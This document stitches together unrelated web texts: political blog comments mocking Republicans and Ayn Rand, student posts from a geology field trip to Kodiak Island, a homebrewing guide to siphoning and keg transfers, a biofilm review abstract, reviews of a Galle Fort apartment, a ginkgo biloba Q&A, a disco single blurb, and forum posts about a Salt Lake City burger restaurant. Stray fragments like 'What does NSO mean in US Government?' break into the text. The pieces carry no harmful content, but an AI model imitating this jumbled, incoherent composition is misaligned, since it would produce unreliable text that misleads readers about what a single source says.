I loved it when Bill O denied to Stewart that the entirety of Levittown had be built by government subsidies.
Every republican voter would have to really live through republican policies to see that they are a bullcrap ideology. Until then, the poor red states vote republican, and I would love to see the look on their faces when they realize that THEY are the very MOOCHERS that the republicans are always talking about.
Sadly, Republicans only seem to gain "empathy" when it impacts them personally. Think Dick Cheney and gay rights or Nancy Reagan and stem cells. I guess it's not really empathy then, is it?
Brilliant - with a caveat - "the government should only rescue ME." A coworker is a single mom on so many government programs she carries around a big binder to keep track of them all. She turned down a raise because if she made more money, she wouldn't qualify for some of the aid she's on. She won't marry her live-in boyfriend for the same reason. Yes, she's a big Republican. When told that the Republicans want to cut those very programs, she says, "No, that's not true. They wouldn't cut them for ME. They'll just cut them for freeloaders." Which apparently means "anyone other than ME."
"..doing some soul-searching after standing in my own urine for most of the night..."
Now that's a great line!!! Not to mention an awakening.
This is totally unbelievable! Objectivists never "rethink" anything; why would they when they already possess Truth™?
On the subject of Rand, I don't think most people know just how vile she was. They think of her as this hyper-libertarian character (which is bad enough), but she was, in fact, just a bigot who thought that we in the west had reached the end of history. I wrote about this recently:

We did have some great weather while we were there and were able to accomplish more than any other year! Some great tree-coring, beach exploring, temperate rainforest hiking, cape tromping and fault mapping. We are currently settled into the University of Alaska, Anchorage rooms and common hall for the final exam and wireless. Here are photos from the past week as well as final thoughts from the students composed last night on the ferry.
Colleen Kennedy - Whew! It has been quite the journey these past few weeks, but I have to say I’m glad to have spent the end of it on the island of Kodiak. Although every time we get to a new place on this adventure, I say it is my favorite thus far- I think Kodiak is definitely up there. Although the weather was not too kind to us as we left, it was gorgeous nonetheless. It is crazy to think that we drove over nearly all the roads on the island! I really enjoyed the mapping project of Isthmus Bay. On the walk out to the isthmus itself (which is the connection between the coast and another smaller piece of land, or in this case rock), erosion had caused all sorts of caves and interesting geological features. The layers of rock, also known as mélange (in this case sandstone and shale), are characteristic of accretionary complexes. Since becoming a geology major, I have studied accretionary complexes for several classes and seen examples in many books- so being able to climb all over evidence of one was an awesome experience and one I’m sure I won’t forget. Another part of Kodiak that was especially interesting was the hike around Narrow Cape. Like the accretionary complex, faults have been a focus of my geology studies and this trip. To actually jump (yes- I jumped… and fell) into the middle of a fault was possibly a once in a lifetime chance. Besides all the rocks, I will be missing Tent Eclogite (The Igloo) and the smores. Although I won’t be living on the edge anymore, I can’t wait to continue on to Denali next week before leaving The Great Land!
Kyra Burnett - So during our last week in Alaska we visited the beautiful Kodiak Island and luckily we were able to receive clear, sunny weather for the first two days we were here. On the last two days however the weather was kind of miserable aka constant down pour 24/7, but that didn’t stop our awesome group! My favorite part of this trip was when we visited Isthmus Bay. Not only being a detective for the day was exciting, but when we actually came up with a testable hypothesis of why the distribution of sediments were the way they were presented to us, I felt like a real scientist!! Finding the evidence of the spruce trees which died in place (they looked like ghost trees) in a particular area. In addition we found that the side of the river bank which was located more towards the ocean had a thicker layer of berm than the side of the bank which was farther way (almost by one meter) was a highlight on this part of the course. Thanks to the super friendly camp-ground host, I was able to enjoy delicious red salmon for the first time. There have been so many great times throughout this trip, and learning how to survive without things like pillows, indoor heating, and my own cd collection (not that I haven’t warmed up to country) became a valuable life lesson for me. Overall this has been such a wonderful opportunity and I would like to thank Jackie and Garver because without them this experience would never be possible.
Sasha Rothenberg - We’ve spent the last week of the trip on the beautiful Kodiak Island, home to the famous Kodiak brown bear (which we never saw). The wet coastal climate makes for some pretty scenic bright green mountains and Kodiak’s location in terms of the subduction zone plate boundary makes it very interesting geologically. Our last hike of the trip was on Narrow Cape where we tried to interpret the different faults there and we learned first hand practice of scientific method: process of making hypothesis based on observations and then looking for evidence to support the hypothesis. On our hike we saw wild horses, a buffalo, and many fields of arctic lupine and other wildflowers. Towards the end of the day we found ourselves digging and hammering into rocks where we could find tons of mussel, snail, and oyster fossils from the Miocene era (over 15 million years old!). Hard to believe the trip is basically over, but at the same time we’ve packed a lot into the past three weeks and it has definitely been a once in a lifetime opportunity.
Mike DeLuca - The last few days on Kodiak Island have been amazing; when we arrived it was warm and sunny. We did a mapping project in Isthmus Bay to study beach deposits and evidence of tsunamis. By using the 1912 Katmai ash as a base point, we could see a post-1912 layer of tsunami sediment that was washed in by the power of the wave. There were several other factors surrounding the area that indicated tsunami activity since 1912, including tree scarring and fields of dead trees due to saltwater deposits that were poorly drained. We also got to see the Ghost Rock formation, which is a meta-sedimentary formation that has gone deep below the ground, been pushed together and then pushed back to the surface. We also had a chance to see Surfer’s Beach and its faults, and the launch complex that was situated right on top of one! It was amazing how subtle these major geologic forces were, often being a slight crack in a formation. We have also been fishing after dinner for red (sockeye) salmon and Dolly Varden (a sea-run trout). Being an avid fly-fisherman this was an unbelievable opportunity, and I was lucky enough to catch some of both. Fishing is a huge part of the Alaskan heritage here, and it was a cultural experience being on the river alongside the natives. They call it “combat fishing” here, standing side-by-side and yelling orders to each other as to where the fish are moving. I found it amazing how they were so skilled at catching these salmon, a major food staple, and how they were so eager to help an obvious tourist like myself. It has been an amazing past few weeks, and I am extremely thankful to my parents for this trip and the Professors’ guidance and vast knowledge in the area.
Gozzie Onyiuke - Hey hey from Kodiak! So this is the last blog…super weird. Time flies when you’re researching faults and evidence of uplift and subsidence eh? Anyway, this last week at Pasagshak was really awesome! First of all, the campground greeted us with a happy ray of sunshine and no annoying bugs! Can you say, BALLIN?! We were right on Pasagshak Bay and you can watch all the fisherman throw their lines out for fish…and then throw it back. Super entertaining. At Isthmus Bay, we did one of my favorite things to do as an up and coming environmental scientist. TREE CORING! We did a mapping project of the evidence that was in the soil, trees, and surrounding environment that pointed to the 1964 earthquake and tsunami. It is so cool that you can find out so many things about an area just by looking at the stuff around you. Trees can be so informative. After that we had a relaxing walk down the bay and we looked at the awesome “ghost rocks”. The G-Man got really excited about them but why wouldn’t he? They are some really cool rocks (about 55 million years old!) Only sad thing is that it started to rain and we had to eat at another campsite (the fire was roaring though!) After that, we went to Surfer’s Beach and we made our own stratographic column of the beach material there. It was so cool. The layers were so intact and each of them had a story of how they got there and why they were important. We got a little dirty that day but its part of the job right? Finally, we headed down to Narrow Cape where we did yet another mapping project but it was a little different this time. We mapped the active fault areas of the Kodiak Launch area. You are probably asking why the government built an incredibly expensive and high tech launch pad on active faults right? Shocking. Luckily active means that it has moved in the last 10,000 years so maybe they think they have time…Interesting…Anyway, we are on the ferry back to Homer and then to Anchorage for the (DUN DUN DUNNNN) exam! I can’t believe 3 weeks have come and gone. I will never forget the amazing times we’ve had and the stories we’ve shared. Anywho, I’m going to miss the great frontier and “mom and dad”. Thanks Jackie and the G Man for this amazing opportunity. Over and out people! PEACE!
Sam O'Connell - Howdy everybody! LOTE is coming to a close, and I must say that the trip has been a valuable experience that I won’t forget. Our last week in Alaska has been all about researching the evidence left behind from the Good Friday Earthquake of 1964. Kodiak experienced a large tsunami as a result of the earthquake, and Isthmus Bay was a great place to see the deposits left by the tsunami. Seeing the dead spruce forest deep into the Bay was very exciting, as we saw exactly what kind of effect the saltwater had on the Sitka Spruce populations. Narrow Cape was also very exciting; I have never seen fault lines exaggerated like that! Debates on mapping the faults were intense, and the hike was spectacular. Because Alaska is so seismically active, it’s a great place to look at geologic processes that we learn about back at Union. We’ve experienced sunny, great weather until today, as the rain has been pouring non-stop. As we prepare to head home, I’ve realized how valuable of an experience camping in Alaska really is, and have grown because of it. A quick side note-Alaskan salmon is good eats!! Adios and sadly back to the lower 48 in a few days!
Nicole Reeger - Greetings everyone! I cannot believe this trip is almost over! We have spent the last week in Kodiak, Alaska. Before arriving in Kodiak we were warned that it rains most of the time but we lucked out with a few dry days, and on the rainy days we got cookies and muffins! Luckily no one had any encounters with the Kodiak grizzly bear but we had a great view of flying bald eagles from the picnic bench at our campsite. Our third mapping project at Isthmus Bay was pretty cool. We cored a lot of trees, which is always good for enhancing my upper body strength. We were surprised to see evidence of the 1964 earthquake from analyzing the tree rings in the area. Counting back from the bark of the tree, right after 1964 we was significant increase in the size of the tree rings, which may have indicated “release from suppression”. Yesterday’s final hike at Narrow Cape was a great way to end this trip. By the end of the day the weather cleared up and we all marched together through the Arctic Lupine. I have done so much in these past three weeks that I have never done before and I am so happy I had the opportunity to come on this trip!
Sarah Logan - Last report here from the Great White North! Cannot believe this trip is almost over! Although cliché I definitely think the best was saved for last! Arriving in Kodiak we were greeted with weather that was the farthest from normal here on the island. It was sunny and the skies were clear. Typically here it rains every day and the sun makes its rare but welcomed appearance according to the locals. Camp was beautiful located right next to the Pacific Ocean where a river ran straight behind our camp, the perfect place to fish as salmon made their spawning run. Day 2 brought even more beautiful weather and a trip to Isthmus Bay where we mapped the storm berm’s and cored trees to see if there was any evidence of the 1964 earthquake and resulting tsunami. Definitely one of my favorite spots of the trip! After a day 3 rain day, day 4 brought beautiful weather again! So off to Narrow Cape! We looked at the faults and tried to decide if there were listric faults or normal faults present. Scenery was amazing and what made it even more incredible was when a pair of wild horses emerged from the trees and ate the grass in a field of lupine. On the ferry back to Homer now and then a drive back to Anchorage for our last night in the state. So bittersweet to be leaving! Don’t want to go home quite yet but I would like some warm weather for the first time in a month! See all of you soo soon! XOXO Sarah
Lauren Graniero - Last blog until returning back east! Since the last post, we spent some time wandering through Isthmus Bay, which was absolutely gorgeous. We did a mapping project where we described different rock facies in the area, pooling our group observations in order to come up with our interpretations of the area. We also discussed, in depth, the formation of an accretionary complex that results from the compression, or squeezing, of geologic formations. Additionally, we wondered what would happen if the coastal berm were breached during the 1964 earthquake in Prince William Sound. At Surfer’s Beach the stratigraphy was especially unique because two entirely different facies were represented within a few feet of each other. The stratigraphic section we created helped us to create and debate a few different scenarios for what may have happened to account for the angular unconformity of the facies. And take it from me, this group enjoys debates. At Narrow Cape, not only was the beach beautiful, but also the multiple faults in the area created a truly awesome landscape full of lakes, swamps and cliffs. Wandering through Kodiak today was another one of our great escapades in which I chatted with locals, ate at local hot spots, bought/made friendship bracelets, and drank coffee after coffee to keep my momentum going. Despite the rough weather we had the past few days, I can honestly say I absolutely enjoyed our last days here, and that it is going to feel a little strange not waking up to these fine individuals everyday! Our adventure living on the EDGE in Alaska has exceeded my expectations and it was an opportunity I am glad I took advantage of! Thank you Jackie and John! Peace and love, xx Laur
Mike Sachs - Kodiak Island where the rain never ends. This is a beautiful island were the mountains rise out of the ocean and the wildlife is plentiful. The other day we went to the Kodiak Launch complex located on Narrow Cape. This cape is very active with normal faults running through it. To the east is the Narrow Cape fault that is a dextral strike slip fault. The launch pad for this site is located right on one of the normal faults. This could be disastrous if this fault were to move. We walked around the entire cape and found many cool fossils on Fossil Beach. That night was our last night fishing on Kodiak and in the Pasagshak River. After having a couple hook ups with some red salmon I finally landed my first Alaskan Red. Seeing a Red break Garver’s rod in two places was something else. Despite the broken rod he still landed the fish. The trip is nearly over and the fishing done. This has been a very enjoyable trip and I cannot wait to come back to Alaska. Go Spain!!!
Zoe Blatt - We spent our last week in Alaska exploring the impacts of the 1964 earthquake on Isthmus Bay and the subduction zone plate boundaries on the Island of Kodiak. Luckily, we had a couple of unusually beautiful days in Kodiak to make our field studies even more enjoyable! We spent Tuesday morning at Surfer’s Beach before we hiked along the coast of Isthmus Bay. We examined the stratigraphy of Surfer’s Beach and discovered there were major differences in such close proximity due to the movement of the strike-slip fault. Be sure to take a look at the great picture of the group standing above the Narrow Cape fault! As the trip comes to an end, I have been able to reflect on the past three weeks and the adventures we have experienced. I have learned an incredible amount about Alaska and natural geological hazards. It has truly been a pleasure to be a part of this journey with my fellow LOTE members and our phenomenal professors. This trip could not have been such a success without Professors Cockburn and Garver’s plethora of knowledge and sincere dedication.

One aspect of homebrewing that is typically much simpler is the transfer of wort and beer around the brewery. In a commercial brewery, the vessels — the hot liquor tanks, mash and lauter vessels, kettles, whirlpools, fermenters and bright beer tanks — do not move and in most the wort or beer is pumped between them. (In a few, tanks are on different levels, allowing for transfers via gravity.)
In a small brewery, the pumps may be mobile and connected to the appropriate tank via temporary hoses as needed. In a larger brewery, all the piping may be fixed, with a dedicated pump for every transfer. Commercial brewers need to worry about fluid transfer rates, cleaning fixed piping in place and the potential for overpressure (or underpressure) situations in the piping.
Although we homebrewers (thankfully) have things a little easier in this respect, there are a few things every homebrewer should know about transferring wort and beer. Transferring liquids in a homebrewery should be relatively quick and the transfer should occur without contamination or unwanted aeration.
Transfers by GravityIn most homebreweries, most transfers occur via gravity. In a 5-gallon (19-L) scale, vessels to be drained of wort or beer often sit above the receiving vessel in the brewing setup. In a vertical 3-tier system, the vessels fit into a frame. For a kitchen brewer, the hot liquor tank may sit on top of the fridge, the picnic cooler mash/lauter tun on the counter and the kettle on the floor during wort collection. In cases where the holding vessel is not “permanently” stationed above the receiving vessel, it can be easily picked up and elevated prior to the transfer.
SpigotThe easiest type a transfer to perform occurs when a vessel has a spigot attached — just open the valve and let the liquid flow. The liquid is usually channeled by clear plastic tubing (such as Tygon tubing) into the receiving vessel. If you are contemplating buying any piece of equipment for your brewery and you have the option of adding a spigot (for example, a ball valve on a kettle), consider it carefully — although it costs more initially, it will save you a lot of time and energy in the long run.
During most transfers, except for the transfer of cold wort to the fermenter, avoiding aeration is a priority. The simplest way to do this is to place the outflow end of the tubing at the bottom of the receiving vessel. Don’t let the liquid fall through the air and splash into the receiving vessel or fan down the side the vessel. Keep the tube at the bottom of the vessel and — once the bottom is covered with liquid — keep the end of the tube under the liquid level. When I transfer, I tilt the receiving vessel slightly and place the end of the tubing at the lowest point. This way, the end of the tube gets covered by liquid more quickly (perhaps reducing aeration very slightly).
SiphonIf your holding vessel doesn’t have a spigot — for example, when transferring from a glass carboy — you will need to start a siphon. Homebrewers usually siphon with a racking cane with clear tubing attached. There are three popular ways to start a siphon — by mouth, by filling the racking tube with water or by using a siphon starter device.
Starting a siphon by mouth is simple. Just place the racking cane in the holding vessel, place the outflow end below the vessel and suck on the tube until the liquid starts flowing. Although simple, many brewers eschew this method out of fears for contamination. (Some gargle with vodka before putting their mouth on the tubing, although this likely does little to reduce the levels of bacteria in their mouth.) In practice, starting a siphon by mouth doesn’t lead to routinely contaminated beer. However, there are easy methods of starting a siphon that remove this potential source of contamination.
One sure-fire way to start a siphon is to completely fill your racking cane with water. Hold the cane so both ends are at the same level (to keep the water from draining out). Then, in one coordinated movement, lower both ends of the tube. While lowering, the “cane” end of the racking cane goes into the holding vessel and the tubing is lowered into the receiving vessel (which is, of course, positioned below the holding vessel).
Keep the ends of the tubing at the same level until the cane end is submerged in liquid, then quickly drop the tubing into the receiving vessel. This will prevent water from flowing from the cane into your beer or wort.
You may want to run the first bit of water into a pitcher before directing the stream of beer to the receiving vessel. To do this, let the pitcher fill until the water is displaced from the tubing, then pinch the tubing and move it to the receiving vessel.
There are a couple types of siphon starters that provide another easy way to get liquid flowing. One design is basically a tube within a tube. The device is placed in the holding vessel as a racking cane would be. The brewer then pumps the siphon starter and the liquid starts flowing. The remainder of the transfer occurs via gravity (i.e. you don’t have to keep pumping the whole time). Another design involves a marble in a little metal “cage” at one end of the tubing. The marble end is placed in the holding vessel and moved up and down rapidly. When the tube moves down, liquid is forced in to it. When the tube is lifted up, fluid pressure on the marble closes the opening. By rapidly moving the tubing for several seconds, liquid begins filling the tube. Once enough liquid is in the tube, a siphon is started.
Most homebrew shops carry one or both of these siphon starters. The advantage of these devices is that it takes less coordination to start a siphon compared to the filled racking cane maneuver. The disadvantage is that they are a little bit harder to clean.
Pumping wort or beerSome homebrewers use pumps to move their wort and beer (as well as circulate it in RIMs and HERMS loops). The advantage of using a pump is that liquid can be moved uphill or between vessels at the same level. In addition, most popular homebrew pumps move the liquid faster than it can be drained by gravity. The only real disadvantage is their initial cost. For 5-gallon (19-L) stovetop brewers, a pump is a luxury. For homebrewers making larger volumes of beer, they are handy and for brewers who have horizontal 3-vessel brewing rigs, they are indispensible. (See the November 2003 issue of BYO for more on pump types and selecting a pump for use in a homebrewery.)
The most popular kind of pump for homebrewers is a centrifugal pump. One of the most popular is a model manufactured by March that sells for around $130 (US). Their pump is food grade and rated for temperatures up to 250 °F (121 °C), so it can transfer or circulate hot wort. It also has a magnetic coupler, so if bits of grain get lodged in the impeller, the shaft won’t break. (The impeller is the spinning part that “throws” liquid out of the pump.)
These pumps work great, but two common problems do surface from time to time. Centrifugal pumps are not self-priming and the pump will quit moving liquid if there is a large enough bubble in the stream of liquid. Situating your pump at or near the lowest point in the tubing goes a long way towards avoiding this problem. If a bubble forms (or is sucked into the line), it will rise in the liquid up past the pump and the pump will again be primed. Keeping all your fittings tight will likewise help keep air from being drawn into the pump as it works.
The second potential problem is cavitation. It does not happen often in homebrew situations, but it can pit the inside of your pump if it does. Cavitation occurs when low pressure inside the pump causes a “bubble” of liquid vapor to form. The “bubble” collapses and makes a loud sound. (Did you know that audible cavitation occurs in the xylem of trees? It does. Did you know that the Navy is developing high-speed torpedoes that travel inside cavitation bubbles, reducing friction because the torpedo never touches water? They are. Did you know that, during cavitation, the collapsing “bubbles” release photons (i.e. emit light)? They do. Did you know that a Google search for “cavitation” brings up all sorts of factoids that have no relevance to homebrewing? It does!)
If you’re recirculating hot wort through a mash and slow flow through the grain bed is making the pressure between the grain bed and pump drop, you might experience cavitation. The usual cures for cavitation are to lower the temperature of the liquid being pumped, raise the pressure on the input side or slow the speed that liquid is being pumping. When brewing, the first two are not options, so slowing the pump is what you need to do. One way to slow the pump is to restrict the output. Most centrifugal pumps sold for homebrewing use can withstand a little back pressure, but check your owners manual to make certain before you try it with your pump. To restrict the output of your pump, just use a tubing clamp on the outflow tubing.
Pressure transfersCornelius (“Corny”) kegs are a popular method for storing and serving beer. However, they can also be used as fermenters with the proper fittings attached. An advantage of using a Corny keg as a fermenter is that beer can be transferred between Corny kegs via CO2 pressure with no exposure to oxygen during the transfer.
Let’s say you have a full Corny keg you’ve used as a secondary fermenter or lagering tank. Clean and sanitize a receiving keg and fill it with water. Connect your CO2 tank to the receiving keg and push all the water out through a tap. Now you have an empty keg filled with CO2. It’s best keep the keg weakly pressurized, around 3–5 PSI.
Next, connect your CO2 tank to the Corny with beer in it, keeping the pressure the same as in the receiving keg. Make a “jumper” line by attaching two “beer out” fittings to a length of tubing. (These are usually black on ball lock/Pepsi kegs.) Attach the jumper line to the “beer out” posts on both kegs (the posts that connect to the spear that extends to the bottom of the keg). To transfer the beer, release the pressure from the receiving keg. The simplest way to do this is to attach a “gas in” fitting (usually grey for Pepsi kegs) to the “gas in” post and let the keg vent. (This is why you want only a small amount of pressure on the keg.) Beer will move up the spear and out of the first keg and down the spear and into the second keg. Remove the connectors once the keg is full and there you have it— a transfer in which the beer is not exposed to oxygen. (OK, a tiny amount will diffuse into the receiving keg against the flow of CO2 out the keg, but not much.)
If you are transferring.
If you attempt to transfer fully carbonated beer this way — perhaps from a 5-gallon (19 L) or larger Corny keg to a 3-gallon (11 L) keg — you may experience problems with foaming. As the beer that has been stored under serving pressures enters the receiving keg at low pressure, CO2 can break out of solution. The solution is to make the initial pressure in the receiving keg equal to the pressure the holding keg has been kept at. Then, release the pressure very slowly so the receiving keg is only a few PSI lower than the holding keg. (You won’t know what the pressure is unless you have a gauge on the receiving tank, but you can judge the relative pressures by how fast beer is flowing through the jumper tubes.)
The best way to do this is to attach some tubing to the “in” fitting that is serving as a vent. Either clamp the tubing in such a way that the pressure is released slowly or keep the tubing clamped shut and periodically let out little bursts of CO2. Watch the jumper tubing and let out another burst of CO2 when the beer flow stops. You can also do the stop and start method using the pressure release valve on the receiving keg, though this may cause excessive wear and tear. If you take care in transferring your wort and beer, the final beer transfer --from your glass to your mouth--should be very enjoyable.What does NSO mean in US Government?

Biofilms are complex microbial communities consisting of microcolonies embedded in a matrix of self-produced polymer substances. Biofilm cells show much greater resistance to environmental challenges including antimicrobial agents than their free-living counterparts. The biofilm mode of life is believed to significantly contribute to successful microbial survival in hostile environments. Conventional treatment, disinfection and cleaning strategies do not proficiently deal with biofilm-related problems, such as persistent infections and contamination of food production facilities. In this review, strategies to control biofilms are discussed, including those of inhibition of microbial attachment, interference of biofilm structure development and differentiation, killing of biofilm cells and induction of biofilm dispersion.Your recent edits

We spent three nights in Galle and had the most amazing time, rising early every day to walk around the old and new parts of town before the heat set in. And then repeating the loop of the Fort in the evening before finding a good place for dinner - one thing is for sure, the locals in Galle sure can cook. Our time in Galle was made all the better by staying with Ranjit and his family in their lovely apartment above the family home. Ranjit is a gentleman and a gracious host. He gave us advice and suggestions when we asked, and he and his wife made us feel welcome by inviting us to share an afternoon snack (of curd and the famous treacle honey) with them. Had we stayed longer I imagine we would have spent many such moments with Ranjit learning about his town and country. Our trip around Sri Lanka was extraordinary, our time in Galle a highlight. I would recommend this cosy, well appointed apartment in the centre of the Fort to anyone who wants the comfort of home abroad, and wants to learn a more than a guide book can offer about life in the southern part of Sri Lanka.
We stayed at Ranjit's place for 6 nights and enjoid every day of it. Ideal location inside the old Fort.close to walk to the new part of Galle for shopping at Keels or Cargills supermarket. We cooked a lot of our night meals. Two nice balkonies to sit and watch life in Galle Fort. the second balkony has a bird and squirrel feeder and is always very busy.
Ranjit and his wife are very friendly and can arrange tuk tuks,vans etc.
We felt like part of the family and will always remember them fondly.
You do not get this experience by staying in a hotel !!
Our stay in Galle (Fort) was absolutely magical, and this greatly thanks to Ranjit and Monina. They were fantastic hosts and their apartment really made us feel at home in this beautiful historical city.
We were lucky enough to discover Ranjit and Monina's secret garden outside of Galle, and this was also a unique experience. What a great couple and what a magical place! We will not hesitate even for a second to return to Ranjit and Monina's apartment next time we come to Sri Lanka!
We loved this apartment in Galle! Moninna and Ranjit are wonderful hosts and it felt great staying in their home. The apartment is completely private even though it's perched above their living spaces. It's great to come down the stairs to chat. There are many excellent reviews and we second them. Many thanks, Petra and Alex.
We had a wonderful time at Ranjit and Moninna. Lovely people and it really felt like staying home. A quiet place in a beautiful Fort and walkable to all important places in Galle Fort. We stayed with our 2 children and they loved the 'house' squirrels, birds and turtles. Especially our sun loved the sri lankan hoppers delivered by Ranjit in the morning.
We can highly recommend this place if you look for a real Sri Lankan experience, a spacey appartment with a very gentle family!!
We had a wonderful experience at Ranjit and Monnina's apartment in lovely Galle Fort.Ranjit and Monnina were excellent hosts,so welcoming,warm,kind and generous.We loved the apartment which was above their living area;it had a side entrance allowing for independence and privacy if you so needed it.But for us it was a joy to have contact with them.Monnina often revived us with her hot tea(brewed from their own grown tea leaves) and ginger biscuits on our return from a hot, tiring day out.The apartment was spacious and comfortable with a cooling sea breeze coming through the airy windows and doors.Loved the quirky decorations and old (website hidden) relaxing watching the little birds and squirrels feeding off the bird feeder in the over- hanging tree.Apartment is just mins from the Ramparts where you can catch the lovely sunsets and enjoy the waves and views.Within very easy reach of eating places and some souvenir shopping.But what made our stay so special are our hosts! They gave us invaluable advice and information regarding transport,eating places,places to see etc.Ranjit even took us through Galle Fort to the town to familiarise us with the Bus station.One day when we were late returning home from a day trip Ranjit phoned us to check that we were O K;how kind and caring!We had our daily breakfast delivered by Ranjit in the form of warm crispy'hoppers' which he buys every morning.Ranjit and Monnina arranged for us to join them on a visit to their small tea plantation which also had cinnamon and exotic fruit trees.Whilst there we were shown how cinnamon as we know it was produced and given a simple but delicious meal by the lovely family looking after the plantation.on our last night Monnina cooked us a fantastic farewell meal!Such generous and warm folks.Thank you very much Ranjit and (website hidden) was a pleasure to meet their lovely daughter, Piyum,too.we definitely recommend staying at their charming apartment in Galle Fort .
Surely it was such a pleasure to meet Susan Yet Yin and Chandra and we were happy that they visited our apartment for a few days. Both of them were very friendly and it was so easy to get on with them. We enjoyed having interesting conversations with them when ever time permitted. We did miss them when they left at the end of their holiday in Sri Lanka. We would really like to meet them again and wish good luck to our new friends, Susan and Chandra.
Super accueil, propriétaire extrêmement sympathiques et prévenant. Le logement est hyper bien placé. Il s’intègre parfaitement a l'ambiance qui règne dans Galle Fort, nous y avons passé deux nuits, mais il a fallu se forcer pour partir. Un petit moment hors du temps. Nous recommandons vraiment cet appartement, et pour info , Galle Fort regorge de petit resto si vous ne souhaitez pas vous faire de cuisine.

Can ginkgo biloba prevent memory loss and improve cognitive function in people with Alzheimer's disease?
Ginkgo biloba, derived from the leaves of the Ginkgo biloba tree, is often touted as a memory aid. But it appears unlikely that ginkgo biloba can prevent memory loss associated with mild cognitive impairment or Alzheimer's disease.
Small, early studies showed modest improvements in cognitive function for older adults with dementia. However, the results of a large-scale study, published in a December 2009 issue of the Journal of the American Medical Association, found no evidence that ginkgo biloba prevents memory loss or slows the progression of cognitive decline in older adults. This was true for both those who had mild cognitive impairment at the start of the study and for those who didn't.
A single study rarely provides a complete picture of the benefits and risks of any herb or drug. However, in this case, ginkgo biloba doesn't appear to be living up to its earlier promise.

Maylee Todd – Hieroglyphics
Maylee’s brand-new single “Hieroglyphics” is her homage to the classic club sounds from the 70s and 80s. This guitar- and synth-driven disco-funk boogie will be sure to have you headed straight for the dance floor! This 7” includes a remix from Kon (of Kon & Amir) & The Gang. A true connoisseur of the art of remixing, Kon has been known to track down original recording sessions from the likes of Barry White, The Bee Gees, and Cerrone; reconstructing them into modern classics that shine a brand-new light on the genius of the original material. “The song to me is reality fiction,” says Maylee. “The two main characters in the song are in love, but the Pharaoh forbids their love because of the class difference between them. She writes him a hieroglyphic love letter that they shall meet in her dreams, or possibly in in reincarnation. ‘Everybody needs a mouth to mouth’ can be interpreted as a breath of life.”

I LOVED IT!!!
I opted for a classic, my husband got the lamb. We split pomme frittes and since a glitch happened with the computer, we were rewarded with a chocolate shake. Glitch was no problem to me, that's what a soft opening is all about.These things get worked out...
They have a website, check it out:
I will definitely return, but I do still need to check out Settebello...

It says "Adam Kreisel is back!"
We popped in Tuesday evening for their first soft night, and we loved it. Outstanding dishes were the heirloom tomato salad, the escolar ceviche
(#1 with a bullet) and the Acme Breath Freshener, destined to become
SLC's fave garlic burger. The berry/tarragon sorbet for dessert was sublime.
The missus made a second visit, and even out the frig, the leftover lamb burger and frites were excellent.
And as of last night, they have liquor. We'll pop into Settebello every now and then, as the pizzas and antipasto are most excellent, but ABC is the new downtown hang for us.
- re: GroovinGourmet
Yeah, I almost went back last night, but was in a foul mood from a trio of rude patrons at Ronstadt (I work for Center for the Arts) and just wanted to take my bad mood home to sulk, not bring my black cloud out, had enough of people. Checked out Settebello Thursday pre Calexico (they were fab!). Settebello was great, too, but I think Acme falls into that comfort food category. I was talking it up to coworkers and DO want to try the Breath Enhancer next. Mmm, I'm starting to salivate...
We made our maiden voyage into Acme Burger Company today and were blown away! The Acme Breath Enhancer was out of this world! We are already looking forward to our next visit. I am excited to try out the Escolar Civeche, or the Lotus Leaf Steamed King Salmon.
It is so exciting to have a new restaurant that is focused on high-quality ingredients, with an ingenious menu. A full bar doesn't hurt either!

- re: gourmand_syndrome
Yeah, baby! And they are still in soft opening. I've been in 3 times, and while not all is perfect, almost everything totally hits the mark. That Escolar Ceviche is definitely a high point, and my fave of the 3 cured fish offerings. Other faves so far are the ostrich burger, the creamed spinach with pernod and the steak fries (not thick planks, but crispy and thicker than the shoestrings). We were able to finagle a cheese board (they only have their prototype and are not taking orders for it yet) and it was as good as any that Adam put forth at the dear departed Globe.
- re: GroovinGourmet
I guess I'll have to drive down the canyon one of these days!!! I couldn't imagine something associated with Adam not being fantastic. I may break my no-red-meat dining habit and get the classic, although I'd like to try his veggieburger. The place is lucky it got the liquor license - there was an article last week that said the DABC only had 19 licenses left for the entire state!
- re: scabbardgirl
I had a bite of my dining partner's veggie burger (just the patty). Not something I would ever consider ordering anywhere BUT an Adam Kreisel offering, and it did not disappoint. I think the king salmon burger is next on my list. Between those 2 and the ostrich you've got 3 trips before you misbehave!
The grass-fed beef is KILLER yummybeefy, btw.
- re: GroovinGourmet
Maybe I'll have to save ABC for my once-a-year red meat fest, instead of the usual blood rare piece of prime rib (must be for the horseradish) :-)
Between the veggie burger and his cheese plate, I'll be one happy camper.
Does he have sweet potato fries on the menu? That would make it true Nirvana!
- re: scabbardgirl
- re: GroovinGourmet
I've been twice now. Both times excellent. Had the Breath Enhancer this time with the rosemary potatoes. Nice to be able to have a beer with my burger now that the license is in place. Both times, I just ended up there, not in the plan for the night. Next time I'll go with a hearty appetite and my plan will be to go for a few of the amazing sounding appetizers, get some variety. Don't even ask me what yet, I'll let my mood guide me. I know I'll be delighted
After reading several reviews of how great Acme was we decided to try it for lunch, EXTREMELY DISAPPOINTING!!!! My husband and I both ordered the classic burgers with extras, cheese, bacon, mushrooms and fries are all add-ons. The burgers came and the meat didn't even fill the bun. The actual burger was good but the garlic killed our stomachs later. The shoestring fries were very good but such a meager serving. Order them with your burger and you'll get more rather than just ordering a side for the table. My daughter had the mac and cheese and it was served in a tiny souffle cup. The service was extremely slow and the place wasn't even busy. We saw 3 couples get up and leave because they had been waiting so long and not even greeted yet by a waitress. Again, it wasn't busy! After a $35 lunch bill we were all wondering what to eat now since none of us were full. It's hard for me to believe no one else has had a poor experience here but maybe we were just too hopeful for a really good burger joint.
- re: snowgirl07
